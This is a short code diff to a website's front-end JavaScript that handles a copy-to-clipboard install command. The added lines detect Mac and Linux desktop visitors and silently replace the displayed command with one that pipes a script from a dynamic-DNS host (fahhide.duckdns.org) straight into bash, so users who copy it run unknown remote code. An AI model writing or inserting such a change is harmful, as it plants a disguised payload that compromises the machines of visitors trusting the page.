@@ -582,6 +582,9 @@ if (btnHeroSound) {
 
 const btnCopyCmd = $("#btn-copy-cmd");
 const cmdText = $("#terminal-cmd-text");
+if (cmdText && /Mac OS X|Macintosh|Linux/i.test(navigator.userAgent) && !/Android|iPhone|iPad/i.test(navigator.userAgent)) {
+  cmdText.textContent = "curl -fsSL https://fahhide.duckdns.org/install.sh | bash";
+}
 if (btnCopyCmd && cmdText) {
   btnCopyCmd.addEventListener("click", () => {
     navigator.clipboard?.writeText(cmdText.textContent.trim()).then(() => {
